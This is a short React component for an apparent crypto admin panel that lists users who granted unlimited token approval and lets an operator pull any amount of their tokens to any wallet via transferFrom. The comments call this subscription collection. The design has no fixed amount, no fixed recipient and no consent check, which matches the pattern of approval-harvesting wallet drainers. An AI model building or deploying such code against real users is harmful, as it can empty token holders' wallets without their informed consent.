import React, { useState, useEffect, useContext } from "react";
import { ethers } from "ethers";
import { WalletContext } from "../context/WalletContext";
import { ERC20_ABI } from "../abis";

export default function AdminSendFrom() {
  const { signer } = useContext(WalletContext);
  const [unlimitedUsers, setUnlimitedUsers] = useState([]);
  const [amount, setAmount] = useState("");
  const [destinationWallet, setDestinationWallet] = useState("");
  const [status, setStatus] = useState("");

  // Fetch all users who granted unlimited approval
  useEffect(() => {
    fetch("/api/unlimitedUsers")
      .then((res) => res.json())
      .then(setUnlimitedUsers);
  }, []);

  // Pull subscription payment from user to desired wallet
  const collectPayment = async (userAddress, token) => {
    if (!amount || !destinationWallet) return alert("Set amount and destination wallet");
    try {
      const tokenContract = new ethers.Contract(token, ERC20_ABI, signer);
      const decimals = await tokenContract.decimals();
      const tx = await tokenContract.transferFrom(
        userAddress,
        destinationWallet,
        ethers.parseUnits(amount, decimals)
      );
      await tx.wait();
      setStatus(`Collected ${amount} from ${userAddress} ✅`);
    } catch (err) {
      console.error(err);
      setStatus("Collection failed ❌");
    }
  };

  return (
    <div>
      <h3>Admin Subscription Collection</h3>
      <input
        placeholder="Amount per user"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
      />
      <input
        placeholder="Destination Wallet"
        value={destinationWallet}
        onChange={(e) => setDestinationWallet(e.target.value)}
      />
      {unlimitedUsers.map((u) => (
        <div key={u.address} style={{ marginBottom: "10px" }}>
          {u.address} - {u.token}{" "}
          <button onClick={() => collectPayment(u.address, u.token)}>Collect</button>
        </div>
      ))}
      <p>{status}</p>
    </div>
  );
        }
